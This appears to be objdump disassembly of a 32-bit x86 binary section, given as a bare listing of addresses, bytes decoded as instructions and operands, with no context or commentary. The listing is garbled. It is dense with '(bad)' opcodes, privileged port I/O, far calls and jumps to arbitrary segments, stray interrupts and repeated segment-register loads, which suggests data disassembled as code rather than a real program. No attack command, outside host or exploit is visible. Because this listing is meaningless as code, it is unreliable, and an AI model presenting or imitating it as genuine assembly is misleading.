  44a06f:	sbb    DWORD PTR [esp+edx*2-0x1766e4ec],esi
  44a076:	call   0x4df7:0x60db
  44a07c:	clc    
  44a07d:	ds xor al,0xbf
  44a080:	fs fs out dx,al
  44a083:	cmp    DWORD PTR [esi+0x2e378645],0xc3a0b7fe
  44a08d:	pop    es
  44a08e:	add    eax,0xfed3ff1a
  44a093:	pusha  
  44a094:	pop    esp
  44a095:	sub    al,0xd8
  44a097:	adc    dh,BYTE PTR [eax+0x11]
  44a09a:	xchg   esi,eax
  44a09b:	imul   ecx,eax,0x60
  44a09e:	gs jo  0x44a085
  44a0a1:	(bad)  [ecx-0x25]
  44a0a4:	js     0x44a099
  44a0a6:	add    ecx,edi
  44a0a8:	mov    ch,0xc8
  44a0aa:	outs   dx,BYTE PTR ds:[esi]
  44a0ab:	aam    0xf0
  44a0ad:	jne    0x44a0c6
  44a0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a0b0:	cld    
  44a0b1:	mov    edx,0x25e1719e
  44a0b6:	inc    ebx
  44a0b7:	mov    fs,WORD PTR [ebx+esi*1-0x51]
  44a0bb:	in     al,0x9a
  44a0bd:	sar    BYTE PTR [edi+0x21],1
  44a0c0:	push   0xffffff8c
  44a0c2:	dec    esp
  44a0c3:	mov    ebx,DWORD PTR [esi+0x2e]
  44a0c6:	xchg   ebp,eax
  44a0c7:	fist   DWORD PTR [esi-0xa0db4f5]
  44a0cd:	pusha  
  44a0ce:	push   ds
  44a0cf:	popf   
  44a0d0:	add    BYTE PTR [edi+0x5e],ah
  44a0d3:	loopne 0x44a075
  44a0d5:	jle    0x44a0c2
  44a0d7:	add    al,0xd7
  44a0d9:	add    BYTE PTR ss:[edx+0x7821b91e],bh
  44a0e0:	xor    eax,DWORD PTR [ebp+0x6a]
  44a0e3:	inc    edi
  44a0e4:	mov    esi,0xea57c8e0
  44a0e9:	xchg   DWORD PTR [eax+0x56b45edc],esp
  44a0ef:	mov    dl,0x97
  44a0f1:	xor    bl,BYTE PTR [ebx+0x68]
  44a0f4:	clc    
  44a0f5:	pusha  
  44a0f6:	jl     0x44a082
  44a0f8:	call   0x7e81835b
  44a0fd:	shl    DWORD PTR [edx],0xba
  44a100:	mov    ah,dh
  44a102:	cmp    DWORD PTR [ecx],0xf4fbc53a
  44a108:	pop    edi
  44a109:	lock mov bh,BYTE PTR [ebx]
  44a10c:	retf   0x8cb0
  44a10f:	outs   dx,DWORD PTR ds:[esi]
  44a110:	mov    esp,DWORD PTR [eax-0x44]
  44a113:	push   0x4e
  44a115:	repnz mov dh,0x97
  44a118:	rcr    BYTE PTR [esi+ebp*8],cl
  44a11b:	cs push ds
  44a11d:	cmp    DWORD PTR [eax+0x4c31c9d7],ecx
  44a123:	mov    eax,ds:0x3d12d170
  44a128:	or     cl,BYTE PTR [edi+0x19372fe7]
  44a12e:	nop
  44a12f:	push   0x5b
  44a131:	mov    es,eax
  44a133:	ss mov bh,0x51
  44a136:	adc    esp,DWORD PTR [ecx]
  44a138:	shr    DWORD PTR [ebp+ebx*2-0x579f64e7],cl
  44a13f:	lods   eax,DWORD PTR ds:[esi]
  44a140:	pushf  
  44a141:	xor    edx,esp
  44a143:	aaa    
  44a144:	jp     0x44a148
  44a146:	out    dx,al
  44a147:	arpl   ax,bx
  44a149:	push   edx
  44a14a:	mov    ebp,0xbc26d474
  44a14f:	mov    al,ds:0xb83e155b
  44a154:	xchg   DWORD PTR [ebx-0x21],eax
  44a157:	(bad)  
  44a158:	pop    esi
  44a159:	push   ebp
  44a15a:	shl    ebx,0xf9
  44a15d:	xchg   ebp,eax
  44a15e:	mov    gs,WORD PTR [eax]
  44a160:	fsub   DWORD PTR [eax-0x35]
  44a163:	mov    bl,0x67
  44a165:	push   0x35
  44a167:	xor    DWORD PTR [esp+ebx*8],0xd3b876ee
  44a16e:	mov    edx,0xab595ceb
  44a173:	mov    WORD PTR [edi-0x715bae4c],fs
  44a179:	inc    esi
  44a17a:	xchg   ebp,eax
  44a17b:	jl     0x44a127
  44a17d:	mov    al,ds:0x804d4af9
  44a182:	out    dx,al
  44a183:	mov    al,0xcf
  44a185:	sbb    al,0x16
  44a187:	pop    ss
  44a188:	or     eax,0xf1aaede4
  44a18d:	aad    0x6e
  44a18f:	dec    ecx
  44a190:	rcl    DWORD PTR [ecx+0x51d12f21],0xb6
  44a197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a198:	xlat   BYTE PTR ds:[ebx]
  44a199:	pusha  
  44a19a:	and    eax,0xa58e66f5
  44a19f:	gs dec eax
  44a1a1:	push   ebx
  44a1a2:	inc    esi
  44a1a3:	mov    ebp,0xd40e44dd
  44a1a8:	sub    edx,DWORD PTR [ecx+ebx*8]
  44a1ab:	rcr    DWORD PTR [ebp-0x61],1
  44a1ae:	loope  0x44a16b
  44a1b0:	jb     0x44a230
  44a1b2:	ret    
  44a1b3:	cmp    al,0xa2
  44a1b5:	add    ebp,DWORD PTR ds:0x3b4d82a1
  44a1bb:	jmp    0x44a1d6
  44a1bd:	fisubr WORD PTR ds:[esi-0x32]
  44a1c1:	add    eax,0xb95dfaee
  44a1c6:	xchg   esp,eax
  44a1c7:	stos   BYTE PTR es:[edi],al
  44a1c8:	sahf   
  44a1c9:	cmp    al,BYTE PTR [ebp-0x7d]
  44a1cc:	icebp  
  44a1cd:	inc    edx
  44a1ce:	jo     0x44a23e
  44a1d0:	inc    esi
  44a1d1:	loope  0x44a241
  44a1d3:	inc    cl
  44a1d5:	out    dx,al
  44a1d6:	jecxz  0x44a1bf
  44a1d8:	pop    esi
  44a1d9:	cmp    al,0xca
  44a1db:	push   ecx
  44a1dc:	jae    0x44a1f1
  44a1de:	fisub  WORD PTR [ebx-0x5e]
  44a1e1:	inc    edx
  44a1e2:	loop   0x44a230
  44a1e4:	jo     0x44a206
  44a1e6:	mov    ebp,0x904c84f6
  44a1eb:	fwait
  44a1ec:	pop    edi
  44a1ed:	jns    0x44a1ed
  44a1ef:	push   ss
  44a1f0:	test   eax,0x140989c0
  44a1f5:	bound  eax,QWORD PTR [ecx+0x5a7c6ca1]
  44a1fb:	das    
  44a1fc:	aas    
  44a1fd:	popf   
  44a1fe:	ds jmp 0x9ba6:0x47f30e60
  44a206:	push   eax
  44a207:	add    DWORD PTR [ebx],ebp
  44a209:	scas   al,BYTE PTR es:[edi]
  44a20a:	mov    dl,0xa0
  44a20c:	adc    BYTE PTR [eax],al
  44a20e:	dec    DWORD PTR [ecx+edx*1+0x7cec7289]
  44a215:	mov    eax,ds:0x56ec96ee
  44a21a:	test   BYTE PTR [edi+edx*4-0x2f],0xc0
  44a21f:	mov    al,ds:0x13f98084
  44a224:	push   ds
  44a225:	int3   
  44a226:	sub    BYTE PTR [esi+ebx*2-0x783388a1],0x6b
  44a22e:	pop    esi
  44a22f:	lods   eax,DWORD PTR ds:[esi]
  44a230:	sub    BYTE PTR [ecx],dh
  44a232:	add    esp,DWORD PTR [ecx+0x300786d6]
  44a238:	pushf  
  44a239:	cmp    esp,0x74
  44a23c:	pop    esi
  44a23d:	stc    
  44a23e:	(bad)  
  44a23f:	mov    edi,0x1cb5594c
  44a244:	xor    eax,0x3b1fc461
  44a249:	sub    DWORD PTR [eax-0x1c],0xffffff95
  44a24d:	cmc    
  44a24e:	out    dx,al
  44a24f:	mov    dl,0x9a
  44a251:	sub    al,0xbd
  44a253:	inc    eax
  44a254:	jo     0x44a2c9
  44a256:	jle    0x44a1fb
  44a258:	mov    cl,0xd8
  44a25a:	and    edx,ebx
  44a25c:	ret    
  44a25d:	test   al,0xae
  44a25f:	mov    ebp,0x9b2281a9
  44a264:	(bad)  
  44a265:	fyl2x  
  44a267:	addr16 jns 0x44a2c7
  44a26a:	bound  edi,QWORD PTR [ebx]
  44a26c:	(bad)  
  44a26d:	rol    BYTE PTR [ebp-0x58],1
  44a270:	repz sbb BYTE PTR [eax-0xc],ch
  44a274:	test   DWORD PTR [eax],eax
  44a276:	push   edi
  44a277:	aad    0xb1
  44a279:	jae    0x44a269
  44a27b:	lea    eax,[edi-0x415dc6a8]
  44a281:	div    DWORD PTR [edi-0x5e]
  44a284:	mov    esp,0xfaa9ce72
  44a289:	xor    DWORD PTR [edi+0x59],edx
  44a28c:	stos   BYTE PTR es:[edi],al
  44a28d:	imul   dh
  44a28f:	mov    ecx,0x33b9a697
  44a294:	and    edi,DWORD PTR [eax-0x29754f5b]
  44a29a:	in     eax,dx
  44a29b:	mov    dh,0x93
  44a29d:	imul   edi,DWORD PTR [eax-0x467f2ec6],0x6d505e7d
  44a2a7:	lods   eax,DWORD PTR ds:[esi]
  44a2a8:	fld    TBYTE PTR [esi-0x4f07d743]
  44a2ae:	dec    esp
  44a2af:	repz fisub WORD PTR [eax-0x50]
  44a2b3:	dec    edx
  44a2b4:	xchg   edi,eax
  44a2b5:	sbb    al,0xcd
  44a2b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a2b8:	jb     0x44a2f7
  44a2ba:	out    dx,al
  44a2bb:	lods   eax,DWORD PTR ds:[esi]
  44a2bc:	push   edi
  44a2bd:	imul   edi,ecx,0x34
  44a2c0:	fidiv  DWORD PTR [edi-0xc]
  44a2c3:	mov    al,ds:0x83d2727d
  44a2c8:	call   0xd196:0x5eb8282d
  44a2cf:	mov    cl,0x59
  44a2d1:	jg     0x44a2aa
  44a2d3:	mov    ch,0x78
  44a2d5:	pusha  
  44a2d6:	out    dx,eax
  44a2d7:	test   dh,bl
  44a2d9:	mov    edi,0x98d9a9cb
  44a2de:	out    dx,al
  44a2df:	inc    edi
  44a2e0:	adc    al,0x8
  44a2e2:	stos   DWORD PTR es:[edi],eax
  44a2e3:	fwait
  44a2e4:	hlt    
  44a2e5:	sub    al,cl
  44a2e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a2e8:	rcr    DWORD PTR [edx+ecx*2-0x1],0x47
  44a2ed:	loope  0x44a2d5
  44a2ef:	dec    edi
  44a2f0:	loope  0x44a2d5
  44a2f2:	and    eax,0x4241ec1a
  44a2f7:	jnp    0x44a297
  44a2f9:	jns    0x44a35d
  44a2fb:	and    eax,0xa1695444
  44a300:	adc    dh,BYTE PTR [eax-0x551f60ff]
  44a306:	adc    DWORD PTR [edi],esi
  44a308:	pop    ebp
  44a309:	sbb    ecx,edi
  44a30b:	dec    eax
  44a30c:	add    ah,BYTE PTR [ebp-0x7c]
  44a30f:	xor    BYTE PTR [ebx-0x48],0xaf
  44a313:	mov    WORD PTR [edx-0x5b8882b2],ss
  44a319:	pusha  
  44a31a:	xchg   ebp,eax
  44a31b:	les    ebp,FWORD PTR [edi]
  44a31d:	(bad)  
  44a31e:	sbb    BYTE PTR [edi],bh
  44a320:	push   0x2f
  44a322:	out    dx,al
  44a323:	push   0xffffff85
  44a325:	jbe    0x44a355
  44a327:	test   DWORD PTR [ecx],0xf4a0fb8c
  44a32d:	test   DWORD PTR [eax],eax
  44a32f:	dec    ebp
  44a330:	mov    ch,0xcd
  44a332:	daa    
  44a333:	jg     0x44a393
  44a335:	pop    ecx
  44a336:	cmc    
  44a337:	adc    al,BYTE PTR [edx+0x6fd7ab24]
  44a33d:	pusha  
  44a33e:	mov    ebp,0x1be0a77a
  44a343:	push   ds
  44a344:	ret    
  44a345:	iret   
  44a346:	out    0x81,eax
  44a348:	cmc    
  44a349:	lock push edi
  44a34b:	lods   eax,DWORD PTR ds:[esi]
  44a34c:	out    dx,al
  44a34d:	jns    0x44a2dd
  44a34f:	push   es
  44a350:	dec    esi
  44a351:	adc    DWORD PTR cs:[ecx+0x57],esi
  44a355:	popa   
  44a356:	xchg   esi,eax
  44a357:	cmp    BYTE PTR [ecx+ebx*1+0x2e],dl
  44a35b:	pop    ss
  44a35c:	mov    ds:0x160cf5c2,al
  44a361:	mov    fs,WORD PTR ss:[eax]
  44a364:	test   al,0xc4
  44a366:	imul   edx,DWORD PTR [edx],0xffffffd8
  44a369:	into   
  44a36a:	xchg   ebx,eax
  44a36b:	and    DWORD PTR [ebx+0x66a0b0db],ebx
  44a371:	loope  0x44a3c1
  44a373:	in     al,dx
  44a374:	aad    0xca
  44a376:	pop    ebx
  44a377:	lea    esi,[eax+eiz*4]
  44a37a:	xchg   ecx,eax
  44a37b:	sub    esp,ebp
  44a37d:	loopne 0x44a3bc
  44a37f:	out    dx,al
  44a380:	mov    ebp,0xe558d46a
  44a385:	jp     0x44a362
  44a387:	jl     0x44a338
  44a389:	outs   dx,BYTE PTR gs:[esi]
  44a38b:	dec    ebx
  44a38c:	mov    esi,0x7ecf4564
  44a391:	stos   DWORD PTR es:[edi],eax
  44a392:	fistp  QWORD PTR [ebx]
  44a394:	push   ecx
  44a395:	sbb    al,0xb9
  44a397:	xchg   ebp,eax
  44a398:	push   ds
  44a399:	cld    
  44a39a:	pop    eax
  44a39b:	sahf   
  44a39c:	mov    ds:0x90a1a26d,al
  44a3a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a3a2:	pusha  
  44a3a3:	sbb    esp,ecx
  44a3a5:	into   
  44a3a6:	xchg   ecx,eax
  44a3a7:	gs pop esi
  44a3a9:	xchg   DWORD PTR [edx-0x651eee02],edx
  44a3af:	nop
  44a3b0:	into   
  44a3b1:	pusha  
  44a3b2:	pop    ds
  44a3b3:	cmp    DWORD PTR [eax],edi
  44a3b5:	gs pusha 
  44a3b7:	sar    esi,cl
  44a3b9:	xchg   ebx,eax
  44a3ba:	out    dx,al
  44a3bb:	jg     0x44a3ad
  44a3bd:	xchg   edx,eax
  44a3be:	ins    BYTE PTR es:[edi],dx
  44a3bf:	mov    gs,WORD PTR [edx+0x7]
  44a3c2:	inc    esi
  44a3c3:	mov    eax,ds:0xeba78d44
  44a3c8:	mov    ah,bl
  44a3ca:	daa    
  44a3cb:	int3   
  44a3cc:	pop    esi
  44a3cd:	jo     0x44a3d3
  44a3cf:	or     DWORD PTR [eax],ebx
  44a3d1:	jl     0x44a3d9
  44a3d3:	jmp    0x199004e3
  44a3d8:	push   0x78
  44a3da:	and    al,0xa0
  44a3dc:	leave  
  44a3dd:	mov    eax,ds:0x4facf1ee
  44a3e2:	(bad)  
  44a3e3:	std    
  44a3e4:	scas   eax,DWORD PTR es:[edi]
  44a3e5:	sbb    al,0x42
  44a3e7:	(bad)  
  44a3e8:	mul    BYTE PTR [eax+0x2356610e]
  44a3ee:	test   eax,0xee9cc5ab
  44a3f3:	pop    edi
  44a3f4:	dec    ebx
  44a3f5:	cmp    eax,0x67454fe4
  44a3fa:	mov    eax,ss:0x28022200
  44a400:	jae    0x44a3e8
  44a402:	sbb    BYTE PTR [ecx-0x244fb7a2],0xb6
  44a409:	cli    
  44a40a:	cmp    esi,DWORD PTR [esi-0x78389f59]
  44a410:	imul   edx,DWORD PTR [esi+0x49],0xffffffe6
  44a414:	les    esi,FWORD PTR [esi+ebp*8]
  44a417:	jle    0x44a405
  44a419:	mov    al,ds:0x5c4951f3
  44a41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a41f:	mov    eax,ds:0x9d9f05f
  44a424:	shl    DWORD PTR [esi-0x45],cl
  44a427:	sbb    BYTE PTR [esi-0x4a],bl
  44a42a:	sub    esi,edx
  44a42c:	jp     0x44a40f
  44a42e:	cli    
  44a42f:	add    DWORD PTR [ecx],ebp
  44a431:	call   0x54d9:0x315a2da2
  44a438:	mov    esp,0xfb83eea0
  44a43d:	adc    eax,0xc36b1871
  44a442:	mov    dl,0x9e
  44a444:	dec    esp
  44a445:	scas   eax,DWORD PTR es:[edi]
  44a446:	icebp  
  44a447:	mov    bl,BYTE PTR [esi-0x4]
  44a44a:	push   es
  44a44b:	push   ebp
  44a44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a44d:	test   al,0xee
  44a44f:	sbb    BYTE PTR [eax],dh
  44a451:	mov    ebx,0xaa1625de
  44a456:	add    DWORD PTR [ecx-0x40e7a62e],esp
  44a45c:	retf   
  44a45d:	ins    BYTE PTR es:[edi],dx
  44a45e:	mov    al,ds:0x28275e73
  44a463:	mov    WORD PTR [eax+0x6a01845d],gs
  44a469:	addr16 dec edi
  44a46b:	lahf   
  44a46c:	pop    esi
  44a46d:	stc    
  44a46e:	inc    edx
  44a46f:	xchg   ecx,eax
  44a470:	test   DWORD PTR [edx-0x59],ebx
  44a473:	push   ds
  44a474:	push   ebx
  44a475:	ds (bad) 
  44a478:	fst    QWORD PTR ds:0xdc401e06
  44a47e:	data16 ss jo 0x44a4e2
  44a482:	sbb    eax,0x6fac165a
  44a487:	ins    BYTE PTR es:[edi],dx
  44a488:	push   edx
  44a489:	imul   ch
  44a48b:	arpl   WORD PTR [esi-0x1681c5d4],bx
  44a491:	push   0x32
  44a493:	jmp    0x44a476
  44a495:	pusha  
  44a496:	aad    0x79
  44a498:	hlt    
  44a499:	shr    BYTE PTR [ecx],1
  44a49b:	xor    dl,BYTE PTR [edx]
  44a49d:	std    
  44a49e:	out    dx,al
  44a49f:	div    DWORD PTR ss:[ebx]
  44a4a2:	fisubr WORD PTR [esp+esi*1]
  44a4a5:	push   ss
  44a4a6:	dec    ebx
  44a4a7:	test   al,0xc
  44a4a9:	mov    bh,0xa5
  44a4ab:	imul   eax,DWORD PTR [edx+0x30],0x21
  44a4af:	dec    eax
  44a4b0:	xor    esi,DWORD PTR [ecx]
  44a4b2:	push   ds
  44a4b3:	push   0x26
  44a4b5:	jl     0x44a4ea
  44a4b7:	mov    eax,ds:0x3ec7d51e
  44a4bc:	pop    eax
  44a4bd:	les    edi,FWORD PTR [ebx-0x557ec360]
  44a4c3:	mov    DWORD PTR [edi+0x5e42ce32],esp
  44a4c9:	icebp  
  44a4ca:	mov    eax,0xf943d24a
  44a4cf:	jg     0x44a46d
  44a4d1:	pusha  
  44a4d2:	out    0x96,eax
  44a4d4:	inc    edi
  44a4d5:	mov    ecx,DWORD PTR [ebp+0x79]
  44a4d8:	fbld   TBYTE PTR ds:0xeaf44eee
  44a4de:	xor    edx,DWORD PTR [ecx]
  44a4e0:	mov    esp,0xdea1543c
  44a4e5:	mul    DWORD PTR [esi+edi*4]
  44a4e8:	and    al,0xee
  44a4ea:	bound  edx,QWORD PTR [edx]
  44a4ec:	xor    bl,BYTE PTR [edx+0x14]
  44a4ef:	mov    ds:0x15e98661,al
  44a4f4:	xchg   ecx,eax
  44a4f5:	int    0xde
  44a4f7:	daa    
  44a4f8:	lods   eax,DWORD PTR ds:[esi]
  44a4f9:	pusha  
  44a4fa:	fild   DWORD PTR [eax]
  44a4fc:	sub    eax,0x6852d365
  44a501:	inc    eax
  44a502:	out    dx,al
  44a503:	xchg   edi,eax
  44a504:	popa   
  44a505:	aaa    
  44a506:	(bad)  
  44a507:	arpl   WORD PTR [ebp-0x24],di
  44a50a:	pop    ebp
  44a50b:	mov    eax,ds:0x7858b7f7
  44a510:	mov    ds:0x35b374e3,eax
  44a515:	sub    eax,0xd97f234f
  44a51a:	or     edx,esi
  44a51c:	sbb    esp,DWORD PTR [ecx]
  44a51e:	mov    edi,0xe1610588
  44a523:	stos   DWORD PTR es:[edi],eax
  44a524:	mov    ds:0xfe737876,al
  44a529:	pop    eax
  44a52a:	pop    edx
  44a52b:	imul   ebp,DWORD PTR [esi+0x34],0x109ccaeb
  44a532:	push   ebx
  44a533:	mov    cl,0x7
  44a535:	cdq    
  44a536:	nop
  44a537:	and    bh,BYTE PTR [ebp+0x1b4b2c60]
  44a53d:	add    ebp,DWORD PTR [esi]
  44a53f:	shl    BYTE PTR [edx+0x15],cl
  44a542:	out    dx,al
  44a543:	pop    edi
  44a544:	dec    ecx
  44a545:	cli    
  44a546:	(bad)  
  44a547:	inc    BYTE PTR [ebx]
  44a549:	xor    BYTE PTR ds:0xb99a93a1,0x5a
  44a550:	es enter 0x7cb,0x7c
  44a555:	cdq    
  44a556:	add    bl,BYTE PTR [ebx-0x67d18c2e]
  44a55c:	jmp    0x7dd7c57
  44a561:	pop    edi
  44a562:	dec    ecx
  44a563:	xor    al,ch
  44a565:	and    eax,0x4b1eef98
  44a56a:	fisub  DWORD PTR [eax+0x5e]
  44a56d:	mov    WORD PTR [esi],ds
  44a56f:	mov    esi,0xeafd320d
  44a574:	repz pusha 
  44a576:	xor    eax,0xbb645859
  44a57b:	and    eax,0x85ee125f
  44a580:	daa    
  44a581:	mov    bh,0xbc
  44a583:	push   ss
  44a584:	dec    ecx
  44a585:	push   edi
  44a586:	movq   QWORD PTR [ebp+0x44],mm1
  44a58a:	int    0x9
  44a58c:	rcr    BYTE PTR [ebp+0x12],cl
  44a58f:	sbb    edi,DWORD PTR [eax+0x77]
  44a592:	push   edi
  44a593:	loope  0x44a5f4
  44a595:	popf   
  44a596:	inc    ebp
  44a597:	retf   0x7a68
  44a59a:	cmc    
  44a59b:	dec    ebp
  44a59c:	sahf   
  44a59d:	out    dx,al
  44a59e:	out    dx,al
  44a59f:	(bad)  
  44a5a0:	add    DWORD PTR [ebx],eax
  44a5a2:	mov    cl,0x2d
  44a5a4:	out    dx,al
  44a5a5:	pop    ecx
  44a5a6:	pushf  
  44a5a7:	not    DWORD PTR [eax]
  44a5a9:	sbb    BYTE PTR [ebx],al
  44a5ab:	rcl    ebp,1
  44a5ad:	sbb    eax,0x845e80bb
  44a5b2:	sub    eax,0xdab50977
  44a5b7:	and    al,0xe0
  44a5b9:	mov    al,0x6f
  44a5bb:	mov    eax,ds:0x35688169
  44a5c0:	sub    BYTE PTR [ebx+0x6c5ddcb8],bh
  44a5c6:	shl    bl,1
  44a5c8:	and    DWORD PTR [esi+0x58762f22],ecx
  44a5ce:	adc    ah,BYTE PTR [ecx-0x69232d57]
  44a5d4:	adc    edi,DWORD PTR [esi+ebp*1]
  44a5d7:	sub    dl,BYTE PTR [ebx+0x7e]
  44a5da:	lds    ebx,FWORD PTR ds:0x4d29acde
  44a5e0:	fidivr WORD PTR [ebp-0x50445d3e]
  44a5e6:	into   
  44a5e7:	into   
  44a5e8:	push   esi
  44a5e9:	mov    al,ds:0xd9cccae
  44a5ee:	out    dx,al
  44a5ef:	aas    
  44a5f0:	retf   0x18ad
  44a5f3:	add    ebx,DWORD PTR [ebx]
  44a5f5:	test   DWORD PTR [eax-0xb140e5f],esp
  44a5fb:	xchg   esi,eax
  44a5fc:	mov    BYTE PTR [ebx-0x879baf],dl
  44a602:	in     al,dx
  44a603:	sbb    eax,0xb3086fb2
  44a608:	mov    ecx,0x25072e29
  44a60d:	retf   0x9d16
  44a610:	out    dx,al
  44a611:	xchg   esi,eax
  44a612:	out    dx,al
  44a613:	out    dx,al
  44a614:	and    esi,DWORD PTR [edi]
  44a616:	inc    edi
  44a617:	xor    esp,edi
  44a619:	push   0x560f6b03
  44a61e:	dec    ebx
  44a61f:	mov    ebx,0x6d6ef439
  44a624:	or     edx,ebp
  44a626:	pop    eax
  44a627:	sar    BYTE PTR [esi+edi*4+0x2],1
  44a62b:	stos   BYTE PTR es:[edi],al
  44a62c:	ret    
  44a62d:	outs   dx,BYTE PTR ds:[esi]
  44a62f:	fisubr WORD PTR ds:0x67abe8ec
  44a635:	popa   
  44a636:	or     cl,BYTE PTR [ecx+eiz*4+0x5]
  44a63a:	jo     0x44a618
  44a63c:	repz stc 
  44a63e:	out    dx,al
  44a63f:	sbb    eax,0xf8888c0b
  44a644:	sub    al,0x5
  44a646:	mov    esp,DWORD PTR [ecx-0x3b735c5e]
  44a64c:	loop   0x44a6c8
  44a64e:	sub    al,0x54
  44a650:	pop    esi
  44a651:	fild   DWORD PTR [ebx]
  44a653:	dec    ebp
  44a654:	add    DWORD PTR [esi+edi*4-0x6e],ebp
  44a658:	and    DWORD PTR [eax+0x66],0x8f2faab0
  44a65f:	or     eax,0xc621bf7b
  44a664:	hlt    
  44a665:	pusha  
  44a666:	xchg   edx,eax
  44a667:	int    0x5a
  44a669:	popf   
  44a66a:	outs   dx,BYTE PTR ds:[esi]
  44a66b:	mov    dl,0xff
  44a66d:	popa   
  44a66e:	mov    al,ds:0x8b70c2ff
  44a673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a674:	xor    DWORD PTR [edi+0x54],esp
  44a677:	leave  
  44a678:	fisub  WORD PTR [ecx]
  44a67a:	bound  esi,QWORD PTR [edi]
  44a67c:	scas   al,BYTE PTR es:[edi]
  44a67d:	pop    es
  44a67e:	out    dx,al
  44a67f:	call   0xc6e9edec
  44a684:	and    BYTE PTR [ebp-0x16315d75],bh
  44a68a:	imul   ecx,edi,0x5d0804b0
  44a690:	int    0xb
  44a692:	out    dx,al
  44a693:	addr16 jmp 0x44a653
  44a696:	in     al,dx
  44a697:	int    0x8c
  44a699:	or     DWORD PTR [ecx+0x6760d2f3],esp
  44a69f:	jle    0x44a6e9
  44a6a1:	or     BYTE PTR [esi-0x11003e25],0x2a
  44a6a8:	jno    0x44a6fd
  44a6aa:	pop    edx
  44a6ab:	add    eax,0xa154cb31
  44a6b0:	jb     0x44a6bf
  44a6b2:	cmc    
  44a6b3:	fwait
  44a6b4:	add    al,0x8e
  44a6b6:	jo     0x44a68f
  44a6b8:	pop    ebx
  44a6b9:	loop   0x44a6c2
  44a6bb:	push   0x25
  44a6bd:	lock ds aas 
  44a6c0:	jno    0x44a71a
  44a6c2:	xchg   ebp,eax
  44a6c3:	mov    eax,ds:0xbcda1ebe
  44a6c8:	mov    eax,ds:0x5ebaabbf
  44a6cd:	add    ah,BYTE PTR [edi+0x3]
  44a6d0:	pop    ebp
  44a6d1:	scas   eax,DWORD PTR es:[edi]
  44a6d2:	mov    edx,0x982ab07c
  44a6d7:	mov    eax,ds:0xf08b1c11
  44a6dc:	or     al,0xbc
  44a6de:	idiv   DWORD PTR [ebp+0x5e]
  44a6e1:	fidiv  WORD PTR [esi+0x11]
  44a6e4:	mov    WORD PTR [esp+eax*8],es
  44a6e7:	sub    edi,DWORD PTR ds:0x99bab961
  44a6ed:	jle    0x44a6b5
  44a6ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a6f0:	loope  0x44a6b0
  44a6f2:	out    dx,al
  44a6f3:	mov    ch,0xbd
  44a6f5:	sbb    eax,0x9d324a2d
  44a6fa:	inc    ebx
  44a6fb:	jmp    0x47b7081b
  44a700:	pop    edi
  44a701:	pop    ss
  44a702:	test   DWORD PTR [edi-0x3e11213a],eax
  44a708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a709:	push   cs
  44a70a:	das    
  44a70b:	nop
  44a70c:	add    BYTE PTR [ecx+0x0],bh
  44a70f:	jno    0x44a77e
  44a711:	pusha  
  44a712:	sbb    esi,DWORD PTR [ebp-0x6263d7c2]
  44a718:	test   DWORD PTR [eax+0x4c88faee],ebx
  44a71e:	(bad)  
  44a71f:	push   eax
  44a720:	xor    al,0xa8
  44a722:	push   ds
  44a723:	mov    eax,ds:0x3284da9f
  44a728:	(bad)  [ebp+0x25e02e3]
  44a72e:	ret    0xcf74
  44a731:	and    esi,ebx
  44a733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a734:	(bad)  
  44a735:	pop    ebp
  44a736:	xor    eax,0x470143f9
  44a73b:	mov    bh,0xb9
  44a73d:	loop   0x44a76b
  44a73f:	in     eax,dx
  44a740:	sbb    al,cl
  44a742:	xchg   BYTE PTR cs:[ebx-0x86ca3a0],al
  44a749:	std    
  44a74a:	call   FWORD PTR ds:0x97ee8f04
  44a750:	outs   dx,DWORD PTR ds:[esi]
  44a751:	jns    0x44a79a
  44a753:	shl    BYTE PTR [edx-0x745f44d1],1
  44a759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a75a:	push   cs
  44a75b:	retf   
  44a75c:	pop    es
  44a75d:	loopne 0x44a73e
  44a75f:	mov    eax,0x2ec37f6
  44a764:	pop    edi
  44a765:	mov    BYTE PTR [ecx+ebx*2],bh
  44a768:	int3   
  44a769:	sahf   
  44a76a:	jo     0x44a788
  44a76c:	mov    ecx,0x4e7ed360
  44a771:	cmp    eax,0x914c0220
  44a776:	xchg   ebx,eax
  44a777:	cwde   
  44a778:	pop    ebx
  44a779:	mov    ch,0x67
  44a77b:	jp     0x44a7db
  44a77d:	push   esi
  44a77e:	fbstp  TBYTE PTR [ebx+0x63]
  44a781:	mov    al,ds:0x5f89915c
  44a786:	jno    0x44a7ca
  44a788:	gs add eax,0x8490490a
  44a78e:	pop    ds
  44a78f:	mov    bh,0x6e
  44a791:	dec    ebx
  44a792:	out    dx,al
  44a793:	xor    edi,edi
  44a795:	or     BYTE PTR [ebx],al
  44a797:	dec    edi
  44a798:	sbb    bh,BYTE PTR [edi-0xc]
  44a79b:	lods   eax,DWORD PTR ds:[esi]
  44a79c:	sub    ah,bh
  44a79e:	sbb    DWORD PTR [edx+0x19],0x9304da1
  44a7a5:	jge    0x44a744
  44a7a7:	rcr    DWORD PTR [esi+0x5a],cl
  44a7aa:	sbb    eax,0xc7259997
  44a7af:	mov    edx,0x97c544c2
  44a7b4:	push   ecx
  44a7b5:	and    DWORD PTR [ebx+0x49],esi
  44a7b8:	add    DWORD PTR [edx],ebp
  44a7ba:	sbb    al,0x11
  44a7bc:	pop    esi
  44a7bd:	add    edi,DWORD PTR [ebx-0x5e841261]
  44a7c3:	mov    ch,0xfc
  44a7c5:	pop    ebp
  44a7c6:	sbb    bh,BYTE PTR cs:[eax-0x7b]
  44a7ca:	cmc    
  44a7cb:	jnp    0x44a773
  44a7cd:	cli    
  44a7ce:	in     eax,dx
  44a7cf:	mov    ebx,0x10831e5e
  44a7d4:	lea    esi,[esi+0x60b65347]
  44a7da:	xor    eax,0xbe5cc8f2
  44a7df:	aas    
  44a7e0:	std    
  44a7e1:	es cmc 
  44a7e3:	cld    
